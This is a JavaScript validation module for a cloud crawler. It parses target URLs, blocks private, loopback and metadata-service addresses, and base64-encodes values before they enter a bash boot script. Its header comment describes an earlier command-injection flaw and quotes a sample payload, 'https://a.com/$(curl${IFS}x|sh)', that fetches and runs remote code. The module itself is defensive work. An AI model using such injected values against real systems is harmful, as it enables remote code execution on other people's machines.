/**
 * What a crawl may target, and how the target reaches the crawler instance.
 *
 * crawl_url launches an EC2 instance whose user-data is a bash script. The
 * target URL used to be interpolated into it as TARGET_URL="<url>", checked
 * only by a regex whose path part was [^\s]*. "$(...)", backticks and quotes
 * all passed, so https://a.com/$(curl${IFS}x|sh) ran as root at boot, on an
 * instance holding the crawler role. The endpoint has no authentication.
 *
 * Two rules now:
 *  - The URL is parsed (WHATWG URL), not pattern-matched. Credentials in the
 *    URL, non-http(s) schemes, and hosts that name this instance's own network
 *    (loopback, RFC 1918, link-local including the 169.254.169.254 metadata
 *    service, CGNAT, multicast, *.internal, localhost) are refused. The parser
 *    normalises decimal and hex IPv4 (http://2130706433/ is 127.0.0.1), so
 *    those forms are refused too. A hostname that *resolves* to such an
 *    address is blocked on the crawler itself (crawl.py), where it resolves.
 *  - No caller value is ever spliced into the script. It travels base64
 *    encoded, whose alphabet cannot leave single quotes, and is decoded on
 *    the instance.
 */
import { isIP } from 'node:net';

export const MAX_URL_LENGTH = 2048;

const BLOCKED_HOSTNAMES = new Set([
  'localhost',
  'instance-data',
  'metadata',
  'metadata.google.internal',
]);
const BLOCKED_SUFFIXES = ['.localhost', '.internal', '.local', '.localdomain'];

// [network, prefix length]: everything an AWS instance can reach that the
// public internet cannot, plus addresses that are never a web server.
const BLOCKED_V4 = [
  ['0.0.0.0', 8], ['10.0.0.0', 8], ['100.64.0.0', 10], ['127.0.0.0', 8],
  ['169.254.0.0', 16], ['172.16.0.0', 12], ['192.0.0.0', 24], ['192.0.2.0', 24],
  ['192.168.0.0', 16], ['198.18.0.0', 15], ['198.51.100.0', 24], ['203.0.113.0', 24],
  ['224.0.0.0', 4], ['240.0.0.0', 4],
];

function v4ToInt(ip) {
  return ip.split('.').reduce((acc, octet) => (acc * 256) + Number(octet), 0);
}

export function isBlockedIPv4(ip) {
  const n = v4ToInt(ip);
  return BLOCKED_V4.some(([net, bits]) => {
    const size = 2 ** (32 - bits);
    const base = v4ToInt(net);
    return n >= base && n < base + size;
  });
}

export function isBlockedIPv6(ip) {
  const a = ip.toLowerCase();
  if (a === '::' || a === '::1') return true;
  // IPv4-mapped (::ffff:a.b.c.d, or the hex form the URL parser produces).
  const mapped = a.match(/^::ffff:(\d+\.\d+\.\d+\.\d+)$/);
  if (mapped) return isBlockedIPv4(mapped[1]);
  const hexMapped = a.match(/^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/);
  if (hexMapped) {
    const hi = parseInt(hexMapped[1], 16);
    const lo = parseInt(hexMapped[2], 16);
    return isBlockedIPv4(`${hi >> 8}.${hi & 255}.${lo >> 8}.${lo & 255}`);
  }
  const first = parseInt(a.split(':')[0] || '0', 16);
  return (first & 0xfe00) === 0xfc00      // fc00::/7 unique local
    || (first & 0xffc0) === 0xfe80        // fe80::/10 link-local
    || (first & 0xff00) === 0xff00        // ff00::/8 multicast
    || a.startsWith('fd00:ec2:');         // the EC2 IPv6 metadata service
}

/** The URL to crawl (trimmed), or throws with a reason the caller can act on. */
export function validateTargetUrl(raw) {
  if (typeof raw !== 'string' || !raw.trim()) throw new Error('url is required (string)');
  const text = raw.trim();
  if (text.length > MAX_URL_LENGTH) throw new Error(`url must be at most ${MAX_URL_LENGTH} characters`);
  let url;
  try {
    url = new URL(text);
  } catch {
    throw new Error('url must be a valid http(s) URL');
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:')
    throw new Error('url must be a valid http(s) URL');
  if (url.username || url.password)
    throw new Error('url must not contain credentials');

  const host = url.hostname.replace(/^\[|\]$/g, '').toLowerCase();
  if (!host) throw new Error('url must name a host');
  const family = isIP(host);
  if (family === 4 && isBlockedIPv4(host)) throw new Error('url must not target a private or internal address');
  if (family === 6 && isBlockedIPv6(host)) throw new Error('url must not target a private or internal address');
  if (family === 0) {
    const name = host.replace(/\.$/, '');
    if (BLOCKED_HOSTNAMES.has(name) || BLOCKED_SUFFIXES.some((s) => name.endsWith(s)))
      throw new Error('url must not target a private or internal address');
    if (!name.includes('.')) throw new Error('url must name a public host');
  }
  // The checks ran on the parsed URL; the caller's text (trimmed) is what is
  // stored and crawled, so a stored session shows the URL as it was given.
  return text;
}

/** Bounded integer, or throws naming the field. */
export function boundedInt(value, name, min, max) {
  if (!Number.isInteger(value) || value < min || value > max)
    throw new Error(`${name} must be an integer ${min}–${max}`);
  return value;
}

/** A value safe inside single quotes in bash: base64 of the UTF-8 text. */
export function shellSafeB64(value) {
  return Buffer.from(String(value), 'utf8').toString('base64');
}
